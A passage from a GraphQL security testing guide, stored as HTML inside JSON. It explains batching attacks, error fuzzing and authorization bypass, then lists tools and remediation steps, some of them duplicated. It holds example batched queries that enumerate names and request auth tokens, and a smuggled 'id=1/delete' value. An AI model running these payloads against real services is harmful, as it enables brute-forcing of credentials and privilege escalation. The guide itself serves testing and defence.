implemented to prevent these types of queries, listed in the Remediation section. Abusive queries can cause issues like DoS for GraphQL deployments and should be included in testing.</p><p>GraphQL supports batching of multiple queries into a single request. This allows users to request multiple objects or multiple instances of objects efficiently. However, an attacker can utilize this functionality in order to perform a batching attack. Sending more than a single query in one request looks like the following:</p><pre><code>[ { query : < query 0 > , variables : < variables for query 0 > , }, { query : < query 1 > , variables : < variables for query 1 > , }, { query : < query n > variables : < variables for query n > , } ]</code></pre><p>In the example application, a single request can be sent in order to extract all of the veterinary names using the guessable ID (it’s an increasing integer). An attacker can then utilize the names in order to get access tokens. Instead of doing so in many requests, which might be blocked by a network security measure like a web application firewall or a rate limiter like Nginx, these requests may be batched. This means there would only be a couple of requests, which may allow for efficient brute forcing without being detected. Here is an example query:</p><pre><code>query { Veterinary ( id : \"1\" ) { name } second : Veterinary ( id : \"2\" ) { name } third : Veterinary ( id : \"3\" ) { name } }</code></pre><p>This will provide the attacker with the names of the veterinaries and, as shown before, the names can be used to batch multiple queries requesting the auth tokens of those veterinaries. For example:</p><pre><code>query { auth ( veterinaryName : \"Julien\" ) second : auth ( veterinaryName : \"Benoit\" ) }</code></pre><p>Batching attacks can be used to bypass many security measures enforced on sites. It can also be used to enumerate objects and attempt to brute force multi-factor authentication or other sensitive information.</p><p>GraphQL can encounter unexpected errors during runtime. When such an error occurs, the server may send an error response that may reveal internal error details or application configurations or data. This allows a malicious user to acquire more information about the application. As part of testing, error messages should be checked by sending unexpected data, a process known as fuzzing. The responses should be searched for potentially sensitive information that may be revealed using this technique.</p><p>GraphQL is a relatively new technology, and some applications are transitioning from old APIs to GraphQL. In many cases, GraphQL is deployed as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If requests to the underlying API are not properly checked for authorization, it could lead to a possible escalation of privileges.</p><p>For example, a request containing the parameter id=1/delete might be interpreted as /api/users/1/delete . This could extend to the manipulation of other resources belonging to user=1 . It is also possible that the request is interpreted to have the authorization given to the GraphQL node, instead of the true requester.</p><p>A tester should try and gain access to underlying API methods as it may be possible to escalate privileges.</p>",
        "tools": "<h3>Tools</h3><ul><li>GraphQL Playground</li><li>GraphQL Voyager</li><li>sqlmap</li><li>InQL (Burp Extension)</li><li>GraphQL Raider (Burp Extension)</li><li>GraphQL (Add-on for ZAP)</li></ul><h3>References</h3><ul><li>poc-graphql</li><li>GraphQL Official Site</li><li>Howtographql - Security</li><li>GraphQL Constraint Directive</li><li>Client-side Testing(XSS and other vulnerabilities)</li><li>5 Common GraphQL Security Vulnerabilities</li><li>GraphQL common vulnerabilities and how to exploit them</li><li>GraphQL CS</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Restrict access to introspection queries.</li><li>Implement input validation.GraphQL does not have a native way to validate input, however, there is an open source project called“graphql-constraint-directive”which allows for input validation as part of the schema definition.Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.</li><li>GraphQL does not have a native way to validate input, however, there is an open source project called“graphql-constraint-directive”which allows for input validation as part of the schema definition.</li><li>Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.</li><li>Implement security measures to prevent abusive queries.Timeouts: restrict the amount of time that a query is permitted to run.Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.Use server-time-based throttling: limit the amount of server time a user can consume.Use query-complexity-based throttling: limit the total complexity of queries a user can consume.</li><li>Timeouts: restrict the amount of time that a query is permitted to run.</li><li>Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.</li><li>Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.</li><li>Use server-time-based throttling: limit the amount of server time a user can consume.</li><li>Use query-complexity-based throttling: limit the total complexity of queries a user can consume.</li><li>Send generic error messages: use generic error messages that do not reveal details of the deployment.</li><li>Mitigate batching attacks:Add object request rate limiting in code.Prevent batching for sensitive objects.Limit the number of queries that can run at one time.</li><li>Add object request rate limiting in code.</li><li>Prevent batching for sensitive objects.</li><li>Limit the number of queries that can run at one time.</li></ul><ul><li>GraphQL does not have a native way to validate input, however, there is an open source project called“graphql-constraint-directive”which allows for input validation as part of the schema definition.</li><li>Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.</li></ul><ul><li>Timeouts: restrict the amount of time that a query is permitted to run.</li><li>Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.</li><li>Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.</li><li>Use server-time-based throttling: limit the amount of server time a user can consume.</li><li>Use query-complexity-based throttling: limit the total complexity of queries a user can consume.</li></ul><ul><li>Add object request rate limiting in code.</li><li>Prevent batching for sensitive objects.</li><li>Limit the number of queries that can run at one time.</li></ul><p>For more on remediating GraphQL weaknesses, refer to the GraphQL Cheat Sheet .</p>",
        "test_objectives": ""
    }
}